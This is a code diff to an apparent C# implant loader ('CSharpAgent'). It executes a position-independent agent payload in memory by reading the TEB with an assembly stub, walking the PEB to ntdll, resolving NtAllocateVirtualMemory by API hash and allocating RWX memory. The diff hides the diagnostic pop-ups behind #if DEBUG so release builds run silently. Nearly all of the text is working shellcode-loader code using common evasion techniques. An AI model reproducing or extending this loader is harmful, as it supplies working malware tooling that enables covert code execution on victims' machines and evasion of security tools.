@@ -30,8 +30,10 @@ namespace CSharpAgent
                 // mov eax, dword ptr fs:[0x18]; ret
                 asm = new byte[] { 0x64, 0xA1, 0x18, 0, 0, 0, 0xC3 };
 
+#if DEBUG
             Diag.Show("[inj 1] arch", (isArm64 ? "ARM64" : IntPtr.Size == 8 ? "x86_64" : "i386") +
                 " — TEB stub " + asm.Length + " bytes, " + bytes.Length + " payload bytes");
+#endif
 
             IntPtr ptr = Marshal.AllocHGlobal(asm.Length);
             Marshal.Copy(asm, 0, ptr, asm.Length);
@@ -43,9 +45,13 @@ namespace CSharpAgent
                 NativeImports.FlushInstructionCache(new IntPtr(-1), ptr, (UIntPtr)asm.Length);
 
             var getTEB = (GetTEBDelegate)Marshal.GetDelegateForFunctionPointer(ptr, typeof(GetTEBDelegate));
+#if DEBUG
             Diag.Show("[inj 2] TEB stub", "calling the get-TEB stub at " + Diag.Hex(ptr));
+#endif
             IntPtr tebAddress = getTEB();
+#if DEBUG
             Diag.Show("[inj 3] TEB", Diag.Hex(tebAddress));
+#endif
 
             NativeImports.ChangeMemoryProtection(ptr, (UIntPtr)asm.Length, oldProtect, out oldProtect);
             Marshal.FreeHGlobal(ptr);
@@ -60,8 +66,10 @@ namespace CSharpAgent
             IntPtr ntdllHandle = Marshal.ReadIntPtr(IntPtrAdd(secondEntry, IntPtr.Size == 8 ? 32 : 16));
             IntPtr ntAllocatePtr = GetProcAddressByHash(ntdllHandle, 3580609816);
 
+#if DEBUG
             Diag.Show("[inj 4] PEB walk", "PEB " + Diag.Hex(pebAddress) + ", Ldr " + Diag.Hex(loaderDataAddress) +
                 ", ntdll " + Diag.Hex(ntdllHandle) + ", NtAllocateVirtualMemory " + Diag.Hex(ntAllocatePtr));
+#endif
             if (ntAllocatePtr == IntPtr.Zero)
                 throw new InvalidOperationException("NtAllocateVirtualMemory hash resolve missed — ntdll export walk failed");
 
@@ -70,7 +78,9 @@ namespace CSharpAgent
             IntPtr pMemory = IntPtr.Zero;
             UIntPtr regionSize = (UIntPtr)bytes.Length;
 
+#if DEBUG
             Diag.Show("[inj 5] alloc", "NtAllocateVirtualMemory — commit+reserve " + bytes.Length + " bytes RWX");
+#endif
             var nt = ntAllocateVirtualMemory(
                 new IntPtr(-1),
                 ref pMemory,
@@ -79,8 +89,10 @@ namespace CSharpAgent
                 0x1000 | 0x2000,
                 0x40
             );
+#if DEBUG
             Diag.Show("[inj 6] alloc result", "NTSTATUS 0x" + ((uint)nt).ToString("X8") +
                 " — base " + Diag.Hex(pMemory) + ", region " + regionSize.ToUInt64() + " bytes");
+#endif
             if (pMemory == IntPtr.Zero)
                 throw new InvalidOperationException("NtAllocateVirtualMemory failed — NTSTATUS 0x" + ((uint)nt).ToString("X8"));
 
@@ -99,17 +111,22 @@ namespace CSharpAgent
 
             int offset = (IntPtr.Size == 8) ? 0x50 : 0x28;
             Marshal.WriteIntPtr(tebAddress, offset, parametersMemory);
+#if DEBUG
             Diag.Show("[inj 7] staged", "payload copied, parameters written to TEB+" +
                 offset.ToString("X") + " (" + Diag.Hex(parametersMemory) + ") — handoff ready");
+#endif
 
             var entry = (EntryDelegate)Marshal.GetDelegateForFunctionPointer(pMemory, typeof(EntryDelegate));
+#if DEBUG
             Diag.Show("[inj 8] entry", "CALLING the PIC agent at " + Diag.Hex(pMemory) +
                 " — this thread is the WS agent's from now on; if the process VANISHES after " +
-                "this box, the payload crashed natively (no managed catch can fire)");
+                "this line, the payload crashed natively (no managed catch can fire)");
+#endif
             entry(uint.MaxValue);
-
+#if DEBUG
             Diag.Show("[inj 9] entry RETURNED", "unexpected — the PIC agent returned immediately " +
                 "(early bail on this box?); the reply reports status 0 anyway");
+#endif
             Marshal.FreeHGlobal(parametersMemory);
         }
 
